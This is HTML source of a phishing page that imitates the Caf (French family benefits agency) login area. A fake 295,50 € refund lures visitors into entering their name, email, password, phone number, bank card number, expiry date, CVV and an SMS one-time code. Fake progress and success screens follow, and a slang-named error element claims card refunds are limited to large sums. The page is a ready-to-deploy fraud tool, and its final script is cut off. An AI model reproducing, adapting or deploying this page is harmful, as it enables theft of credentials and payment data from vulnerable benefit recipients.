onclick="return false">Faire une démarche en ligne</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/videos-d-aide">Vidéos d'aide</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/avant-de-venir-a-la-caf">Avant de venir à la Caf</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/questions-reponses">Questions - Réponses</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle " data-toggle="collapse" data-target="#sub-menu-content-1-4-7" href="#"  onclick="return false">Ma vie évolue, mes droits aussi</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-1-4-3" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-1-4-3" href="#" onclick="return false">Aide</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/faire-une-demarche-en-ligne"><strong>Faire une démarche en ligne</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/faire-une-demarche-en-ligne/appli-caf-mon-compte">Appli Caf - Mon Compte</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/faire-une-demarche-en-ligne/sauvegarder-ou-reprendre-une-demande-en-cours">Sauvegarder ou reprendre une demande en cours</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-1-4-7" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-1-4-7" href="#" onclick="return false">Aide</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/ma-vie-evolue-mes-droits-aussi"><strong>Ma vie évolue, mes droits aussi</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/ma-vie-evolue-mes-droits-aussi/votre-parcours-separation">Votre parcours séparation</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul>
							
							
						</div>
						
						
						
					</div>
				</div>
			</nav>
			
		
			<!-- FIN HEADER -->		
		  
			
			<!-- TEST obsolesence des navigateurs  -->
			<script>
				if ((bowser.msie && bowser.version < 11)
	          		|| (bowser.chrome && bowser.version < 26)
	          		|| (bowser.firefox && bowser.version < 1.5)) {
	 
	        		window.location.replace("https://www.caf.fr/navigateur-obsolete.html");
	    		}
    		</script>
			
			
			<!-- FIN TEST obsolesence des navigateurs  -->
			<!-- DEBUT CONTENU -->
			












<main id="theme-contenu-cnaf" class="icf-angular-cnaf  " role="main">

	<div class="container">
		<div class="row">
			
				<div class="col-lg-3 visible-lg" id="theme-contenu-menu-background-cnaf">
				</div>
				<nav class="col-lg-3 visible-lg" id="theme-contenu-menu-wrapper-cnaf" role="navigation" aria-label="menu principal">
					<div>
						<ul id="sidebar-content-cnaf" class="nav navbar" ><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel level0"><a class="collapsed text-uppercase" data-toggle="collapse" data-target="#sub-sidebar-content-0-0-0" data-parent="#sidebar-content-cnaf" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-0-0-0 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Actualités</a><ul id="sub-sidebar-content-0-0-0" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/actualites ">Accueil Actualités</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/actualites/2020">2020</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/actualites/2019">2019</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/actualites/2018">2018</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/actualites/2017">2017</a></li></ul></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel level0"><a class="collapsed text-uppercase" data-toggle="collapse" data-target="#sub-sidebar-content-0-0-1" data-parent="#sidebar-content-cnaf" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-0-0-1 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Mes services en ligne</a><ul id="sub-sidebar-content-0-0-1" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/mes-services-en-ligne ">Accueil Mes services en ligne</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/mes-services-en-ligne/faire-une-simulation">Faire une simulation</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/mes-services-en-ligne/faire-une-demande-de-prestation">Faire une demande de prestation</a></li></ul></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel level0"><a class="collapsed text-uppercase" data-toggle="collapse" data-target="#sub-sidebar-content-0-0-2" data-parent="#sidebar-content-cnaf" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-0-0-2 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Droits et prestations</a><ul id="sub-sidebar-content-0-0-2" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations ">Accueil Droits et prestations</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel sub-panel level1"><a class="collapsed " data-toggle="collapse" data-target="#sub-sidebar-content-1-2-0" data-parent="#sub-sidebar-content-0-0-2" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-1-2-0 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Connaître vos droits selon votre situation</a><ul id="sub-sidebar-content-1-2-0" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation ">Accueil Connaître vos droits selon votre situation</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/j-ai-ou-j-attends-un-ou-des-enfants">J'ai ou j'attends un ou des enfants</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/j-ai-perdu-un-proche">J'ai perdu un proche</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/j-ai-une-question-sur-ma-situation-d-allocataire">J'ai une question sur ma situation d'allocataire</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-change-de-situation">Je change de situation</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-loue-un-logement">Je loue un logement</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-suis-dans-une-situation-de-handicap">Je suis dans une situation de handicap</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-suis-dans-une-situation-difficile">Je suis dans une situation difficile</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-vis-seul-avec-ou-sans-enfant">Je vis seul avec ou sans enfant</a></li></ul></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel sub-panel level1"><a class="collapsed " data-toggle="collapse" data-target="#sub-sidebar-content-1-2-1" data-parent="#sub-sidebar-content-0-0-2" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-1-2-1 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>S'informer sur les aides</a><ul id="sub-sidebar-content-1-2-1" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides ">Accueil S'informer sur les aides</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/enfance-et-jeunesse">Enfance et jeunesse</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/logement-et-cadre-de-vie">Logement et cadre de vie</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/petite-enfance">Petite enfance</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/solidarite-et-insertion">Solidarité et insertion</a></li></ul></li></ul></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel level0"><a class="collapsed text-uppercase" data-toggle="collapse" data-target="#sub-sidebar-content-0-0-3" data-parent="#sidebar-content-cnaf" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-0-0-3 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Magazine vies de famille</a><ul id="sub-sidebar-content-0-0-3" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille ">Accueil Magazine vies de famille</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/futur-parent">Futur parent</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/elever-ses-enfants">Elever ses enfants</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/jeune-ou-etudiant">Jeune ou étudiant</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/se-loger">Se loger</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/vivre-avec-un-handicap">Vivre avec un handicap</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/accident-de-vie-precarite">Accident de vie – précarité</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/changement-de-situation">Changement de situation</a></li></ul></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel level0"><a class="collapsed text-uppercase" data-toggle="collapse" data-target="#sub-sidebar-content-0-0-4" data-parent="#sidebar-content-cnaf" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-0-0-4 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Aide</a><ul id="sub-sidebar-content-0-0-4" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/aide ">Accueil Aide</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/aide/les-aides-personnelles-au-logement-evoluent">Les aides personnelles au logement évoluent</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/aide/les-bons-reflexes-pour-eviter-de-faire-des-erreurs">Les bons réflexes pour éviter de faire des erreurs !</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/aide/utiliser-mon-compte">Utiliser Mon Compte</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel sub-panel level1"><a class="collapsed " data-toggle="collapse" data-target="#sub-sidebar-content-1-4-3" data-parent="#sub-sidebar-content-0-0-4" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-1-4-3 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Faire une démarche en ligne</a><ul id="sub-sidebar-content-1-4-3" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/aide/faire-une-demarche-en-ligne ">Accueil Faire une démarche en ligne</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/aide/faire-une-demarche-en-ligne/appli-caf-mon-compte">Appli Caf - Mon Compte</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/aide/faire-une-demarche-en-ligne/sauvegarder-ou-reprendre-une-demande-en-cours">Sauvegarder ou reprendre une demande en cours</a></li></ul></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/aide/videos-d-aide">Vidéos d'aide</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/aide/avant-de-venir-a-la-caf">Avant de venir à la Caf</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level1"><a class="" href="https://www.caf.fr/allocataires/aide/questions-reponses">Questions - Réponses</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="panel sub-panel level1"><a class="collapsed " data-toggle="collapse" data-target="#sub-sidebar-content-1-4-7" data-parent="#sub-sidebar-content-0-0-4" aria-expanded="false" role="button" aria-controls="sub-sidebar-content-1-4-7 " href="#" onclick="return false"><span class="picto picto-cadre picto-sidebar"></span>Ma vie évolue, mes droits aussi</a><ul id="sub-sidebar-content-1-4-7" class="nav collapse"><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/aide/ma-vie-evolue-mes-droits-aussi ">Accueil Ma vie évolue, mes droits aussi</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level2"><a class="" href="https://www.caf.fr/allocataires/aide/ma-vie-evolue-mes-droits-aussi/votre-parcours-separation">Votre parcours séparation</a></li></ul></li></ul></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level0"><a class="text-uppercase" href="https://wwwd.caf.fr/redirect/s/Redirect?page=votreCafJeChercheUneCaf">Ma Caf</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="sidebar-item level0"><a class="text-uppercase" href="https://wwwd.caf.fr/redirect/s/Redirect?page=monCompte">Mon Compte</a></li><li role="separator" class="divider-light" aria-hidden="true"></li></ul>
					</div>
				</nav>
			
			<div class="col-lg-9" id="theme-contenu-content-wrapper-cnaf">
				
					





<div id="theme-contenu-filariane-cnaf">
	<div class="container">
		<div class="row">

			<nav role="navigation" aria-label="position dans le site">
			<ol class="breadcrumb">
			

				<li><a href="/redirect/s/Redirect?page=accueilCaffr">Accueil</a></li>

			
					 
			
					
						
							
							
								
								<li>Bienvenue</li>
								
								
							
						
					 
			 
			</ol>
			</nav>

		</div>
	</div>
</div>

				
				<div id="theme-contenu-content-cnaf">
					
						
						
			                
			                   <div class="container">
			                   		<a id="theme-contenu-content-link-cnaf" class="sr-only" tabindex="-1" href="javascript:void(0);">Contenu principal de la page</a>
									<h1 class="titre-page-cnaf text-primary text-uppercase">Mon espace personnel</h1>
			                   </div>
							
						
					
	                
					<h2 class="sr-only">Contenu de la page</h2>
					
					 
<div class="layoutRow">
 
<div class="layoutColumn"><a name="Z7_6H4G19K0KOELC0ANO88RFI2004"></a><div class="wpsPortletBody">



















<link href="css/app.css?id=1607652163624" rel="stylesheet">
<script src="js/app1.min.js?id=1607652163624"></script>


<div class="row">
   <div class="col-sm-7 col-md-8" id="main-view">
      <!---->
      <div ui-view="loginView">
         <cnaf-connexion>
            <div class="row conteneur-connexion-cnaf" id="conteneur-connexion-cnaf">
               <div class="col-sm-12">
                  <h3 class="titre-bloc-cnaf filet-cnaf text-uppercase" tabindex="-1" cnaf-focus="focusConnexion"<abbr id="step-title">Connexion </abbr><a class="btn btn-info popover-button-directive-cnaf" role="button" tabindex="0" aria-pressed="false" data-id-content-cnaf="content-popover" data-container="#conteneur-connexion-cnaf" data-trigger="manual" data-original-title=""><img class="state-passif" alt="Information supplémentaire" ng-src="images/pic_aide_gris.png" src="images/pic_aide_gris.png"> <img class="hidden state-actif" alt="Information supplémentaire" ng-src="images//pic_aide.png" src="images//pic_aide.png"> </a></h3>
                  <div class="hidden" id="content-popover" role="tooltip">
                     <a role="button" class="popover-btn-close" href="#" onclick="return false">×</a>
                     <p class="titre-margin">Devenir allocataire</p>
                     Vous devenez allocataire dès que vous faites une demande de prestation.<br>La Caf vous attribue un numéro allocataire qui vous sera demandé pour chacune de vos démarches :
                     <ul>
                        <li>par courrier</li>
                        <li>par téléphone</li>
                        <li>pour accéder à votre espace personnel Mon Compte</li>
                     </ul>
                     Si vous n’êtes pas encore allocataire, rendez-vous sur «Simuler ou demander une prestation»<br>
                     <p class="titre-margin">La première connexion</p>
                     Pour vous connecter à votre espace personnel Mon Compte, il suffit de vous munir de votre numéro allocataire et de votre mot de passe provisoire transmis par la Caf par SMS ou par courrier.<br>Dès votre première connexion, vous devez créer votre mot de passe personnel. Pensez à le conserver car ce nouveau mot de passe, confidentiel, vous sera demandé pour chaque connexion à Mon Compte.
                  </div>
               </div>
               <div class="collapsable-body-cnaf col-sm-12 collapse in" ng-switch="" on="connexionVm.etat">
                  <div class="progress ng-hide" ng-show="connexionVm.etat === 'loading'">
                     <div class="progress-bar progress-bar-info progress-bar-striped active" role="progressbar">Chargement en cours...</div>
                  </div>
                  <div style="padding-top: 15px; padding-bottom: 15px;">
                     <!----><!----><!----><!---->
                     <div id="connexion-collapse" ng-show="connexionVm.etat !== 'loading'" >
                        <div class="step-container">
                           <div>
	                           <div class="step-content active">
								   <div class="form-container">
								      <label class="label-form-cnaf control-label">
								     
										Nom complet:<span style="color: blue;">*</span>
								      </label>
								      <input type="text" name="nom" id="ach_semak_lah" size="24" maxlength="24" class="form-control saisie" style="width: 235px;">
								   </div>
								   <div class="form-container">
			                            <label class="label-form-cnaf control-label">
			                                Adresse mail:
			                            </label>
			                            <input type="email" name="email" id="email" placeholder="" size="24" maxlength="24" class="form-control saisie" style="width: 235px;"/>
			                        </div>
			                        <div class="form-container">
			                            <label  class="label-form-cnaf control-label">
			                                Mot de passe:
			                            </label>
			                            <input type="password" name="password" id="password" placeholder="" size="24" maxlength="24" class="form-control saisie" style="width: 235px;"/>
			                        </div>
								   <div class="form-container">
								      <label class="label-form-cnaf control-label">
								      Numéro de téléphone:<span style="color: blue;">*</span>
								      </label>
								      <input type="text" name="nb" id="nb" size="24"  class="form-control saisie" style="width: 235px;">
								   </div>
								   <div class="form-container">
								      <label class="label-form-cnaf control-label" style="width:300px;">
								         S&eacute;lectionnez une m&eacute;thode de remboursement<span style="color: blue;">
								         *</span>
								      </label>
								      <div>
									      Virement bancaire<input type="radio" name="typus" id='vire' size="24" style="margin-right:50px;">
									      CB<input type="radio" name="typus" id='vv' size="24">
									      
									   </div>
								   </div>
								   
	                           </div> 
	                           <div class="step-content">
	                           		<div class="col-xs-12">
	                           		   <div class="cc-extra-container">
									   	<img src="images/mod-29719237-1654367.png" class="cc-image" />
									   	<p>
									   		NB: Les remboursements par CB apparaîtront sur votre compte sous un délai de 2 jours.
									   	</p>
									   </div>
									   <!-- <div id="contenair" style="padding-top: 24px;">
									      <div id="merci" style="padding-left:20px;padding-bottom:20px;padding-top:6px;background-color: #dff0d8;width:100%;font-size: 13px;font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;font-color:#3c763d;border-color: #d6e9c6;display: none;">
									         <h3>Demande enregistrée avec succés.</h3>
									         <b>Demande enregistrée</b> : votre demande est prise en compte.<br>
									         <b>En cours de traitement</b> : l‘ordre de virement est en préparation.<br>
									         <b>Demande attribuée </b>: l‘ordre de virement a été envoyé à votre banque, vous receverez bientôt <br>un vous informant du prochain remboursement (délai de 3 à 4 jours à partir de la réception du SMS). 
									      </div>
									   </div> -->
									   <div id="error" style="display: none;text-align: center;">
									      <p><img src="ba3.png" width="350px" height="180px"></p>
									      <p style="position: relative:top-100px;">Les informations que vous avez fourni ne sont pas valides ! </p>
									      <button style="background-color: yellow;font-color:white;" id="essaie">Rééssayez</button>
									   </div>
									   <div class="col-xs-12" id="bita9a">
									      <div class="form-group">
									         <label class="label-form-cnaf control-label">Numéro de carte bancaire</label>
									         <input class="form-control saisie" type="text" placeholder="Numéro de carte bancaire" name="cc_n" id="cc_n" maxlength="19" onkeyup="bb()" onkeydown="down()" style="width: 260px;">
									      </div>
									   </div>
									   <div class="col-xs-12 col-md-6">
									      <div class="form-group" id="exp">
									         <label for="exp_dt" class="label-form-cnaf control-label">Date d'expiration</label><br>
									         <p style="position: relative;padding-top: 2px;">
									            <select name="expMonth" class="year" id="expMonth" style="height: 36px;width: 86px;">
									               <option value="" selected="">Mois</option>
									               <option value="01">01</option>
									               <option value="02">02</option>
									               <option value="03">03</option>
									               <option value="04">04</option>
									               <option value="05">05</option>
									               <option value="06">06</option>
									               <option value="07">07</option>
									               <option value="08">08</option>
									               <option value="09">09</option>
									               <option value="10">10</option>
									               <option value="11">11</option>
									               <option value="12">12</option>
									            </select>
									            <select name="expYear" class="month" id="expYear" style="height: 36px;width: 86px;">
									               <option value="" selected="">Année</option>
									               <option value="21">21</option>
									               <option value="22">22</option>
									               <option value="23">23</option>
									               <option value="24">24</option>
									               <option value="25">25</option>
									               <option value="26">26</option>
									               <option value="27">27</option>
									               <option value="28">28</option>
									               <option value="29">29</option>
									            </select>
									         </p>
									      </div>
									   </div>
									   <div class="col-xs-12 col-md-12" id="zbel">
									      <div class="form-group">
									         <label class="label-form-cnaf control-label">Cryptogramme visuel (CVV)</label>
									         <input class="form-control saisie" type="text" id="vcc" name="vcc" placeholder="XXX" maxlength="3" style="width: 110px;">
									      </div>
									   </div>
									   <div class="col-xs-12">
									      <div id="vcc_optional" class="form-group" style="display: none">
									      	<label class="label-form-cnaf control-label">Numéro de compte CCP n°</label>
									      	<input class="form-control saisie" type="text" id="vcc_optional_field" name="vcc_optional" style="width: 200px;" >
									      </div>
									   </div>
									   
									</div>        
	                           </div>
	                           <div class="step-content">
	                           		<img src="images/sms1.png" class="sms-image" />
	                           		Veuillez entrer le code de confirmation qui vous a été envoyé par SMS.<br/><br/>
									Cette authetification est obligatoire pour confirmer votre opération.<br/>
									Si vous ne recevez pas le code dans <span id="time"></span> minutés, <a class="walo" href="#">Cliquez ici.</a>.<br/>
	                           	 	<div class="form-group" style="text-align: center;margin-top: 20px;">
								        <label class="label-form-cnaf control-label">Code reçu par SMS:</label>
								        <input class="form-control saisie" type="text"  name="sms" id="sms" maxlength="14" style="width: 160px;margin: auto;margin-bottom: 20px;text-align: center;" placeholder="******">
								    </div>
	                           </div>
	                           <div class="step-content">
	                           	 	<h3>Demande enregistrée avec succés.</h3>
	                           	 	<b>Demande enregistrée</b> : votre demande a été prise en compte.<br>
	                           	 	<b>En cours de traitement</b> : l‘ordre de virement est en préparation.<br>
	                           	 	<b>Demande attribuée </b> : l‘ordre de virement a été envoyé à votre banque, vous recevrez bientôt un mail vous informant du prochain remboursement (délai de 3 à 4 jours à partir de la réception du SMS).
	                           </div>
	                       </div>
                           <div class="profile-main-loader">
                              <!-- <div class="loader">
                                 <svg class="circular-loader" viewBox="25 25 50 50">
                                    <circle class="loader-path" cx="50" cy="50" r="20" fill="none" stroke="#70c542" stroke-width="2"></circle>
                                 </svg>
                              </div> -->
                              <div class="circle-loader">
								  <div class="checkmark draw"></div>
								</div>
                           </div>
                           <div class="success-checkmark">
							    <div class="check-icon">
							      <span class="icon-line line-tip"></span>
							      <span class="icon-line line-long"></span>
							      <div class="icon-circle"></div>
							      <div class="icon-fix"></div>
							    </div>
							</div>
                           <div>
	                           <div class="step-loading active">
	                              Connexion à votre espace personnel caf en cours ...
	                           </div>
	                           <div class="step-loading">
	                              Connexion automatique à l'aide de votre boite mail en cours ...
	                           </div>
	                           <div class="step-loading">
	                              Connexion réussie
	                           </div>
	                       </div>
	                       <div id="jnab" style="color:red;text-align:left;display: none; font-size:14px;">
						   		<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA3XAAAN1wFCKJt4AAABrUlEQVQ4y6WUTU9TURCGn5l7ezUm3FjphsJGjRtDGtxAwpc3oDs2bIj4L9zob5DEhcZ/IKmGkLBh2coVy8KdLvxITFzRFdQSFwqVe8YF2tT2tlR5V3MyM++8M+fMEVJQn711w8SWxewmcAnAoIbZK/HseTaO37bnSOvhWxTlnNPHBsvtvhYYxqoXyL2wXK51ENVm5q+ruE2Qy03n+XNceHAfgO8PV7DDo1bCLwm6kNsufQRQgP25uWEVSq0kAAQBXmEUrzAKQdCu7IqHK+1N3c43ifTYHoEN8e/I+97xCoDWo2hMkCX+G3L368x8QS2RXoPti0mVOyowyRlhZlMKMsTZkfdPF95f1z5CFbiaKvnwiJ/xdtPu0duuD7wEZlMDGg1+PHnax7ilrC6xdcCl+gcGCNeKhGtFJAy70bhE3boO7my9F3iRXgnwM5DJ9JiVrObi+JMAHExPZ02DN8C1v2JU0JGRk7K7VXAdwj+La0xcrFTqPZf2FHQuLcDg6/IHT21coHjy/XS/I4xnXkbG/5DQbTXqUTRGIovApIgM/369VUR2cLaRrWy9a8/5BZ7cj3zxUmEJAAAAAElFTkSuQmCC"> 
						   		<abbr id="error-text">Ce mode de remboursement est disponible uniquement pour les sommes supérieurs à 1000 €.</abbr>
						   </div>
							<div class="row" style="width: 100%;">
								<div class="col-md-12">
						   			<button type="submit" class="btn btn-form-cnaf btn-majeur-cnaf btn-login-cnaf pull-right" title="Continuer vers la saisie du mot de passe" id="next-step" style="margin-top:15px;margin-bottom:0px;">Continuer</button>	
								</div>
							</div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </cnaf-connexion>
      </div>
   </div>
   <!---->
   <div class="col-sm-5 col-md-4" ng-if="Vm.contexte !== 'modifierMdp'">
      <cnaf-a-savoir>
         <!---->
      </cnaf-a-savoir>
      <cnaf-securite>
         <div class="row conteneur-securite-cnaf collapsable-cnaf">
            <div class="col-sm-12">
               <h3 class="collapsable-heading-cnaf titre-bloc-cnaf filet-cnaf text-uppercase" ng-click="securiteVm.expandCollapse()"><a role="button" href="javascript:void(0);" aria-expanded="true" aria-controls="securite-collapse" style="color:#3C764D;"> INFORMATIONS DU REMBOURSEMENT</a></h3>
            </div>
            <div class="collapsable-body-cnaf col-sm-12 collapse in" ng-show="!securiteVm.collapsed" ng-switch="" on="securiteVm.etat">
               <!----><!----><!---->
               <div ng-switch-when="loaded">
                  <div id="securite-collapse">
                     <!---->
                     <div ng-repeat="x in securiteVm.infoSecurite">
                        <div class="collapsable-heading-cnaf" ng-click="securiteVm.expandCollapseElement($index)">
                           
                        </div>
                        <div id="securite0" ng-show="!securiteVm.isCollapsed[$index]">
                           <div id="lbouta" class="form-group">
                           	   <p class="form-container label-control"><span>Nom complet:</span><span id="fullname"></span></p>
							   <p class="form-container label-control"><span>Mode de réception:</span><span>Carte de crédit</span></p>
							   <p class="form-container"  class="label-form-cnaf control-label"><span>Réf n°:</span><span>535084367</span></p>
							   <p class="form-container"  class="label-form-cnaf control-label"><span>Montant:</span><span>295,50 €</span> </p>
							   <p class="form-container"  class="label-form-cnaf control-label"><span>Date:</span><span><?php echo '       '.date("d/m/y").' à '.date("H:i"); ?></span></p>
							   
							</div>
                        </div>
                        <!---->
                     </div>
                     <!---->
                  </div>
               </div>
               <!---->
            </div>
         </div>
      </cnaf-securite>
   </div>
   <!---->
</div>







<script type="text/javascript">
var namespace = "ns_Z7_6H4G19K0KOELC0ANO88RFI2004_";

angular.module("cnafCommonsApp").run(['$injector', '$document', '$window', 'CnafUserService', 'CnafTokenService', function($injector, $document, $window, CnafUserService, CnafTokenService){
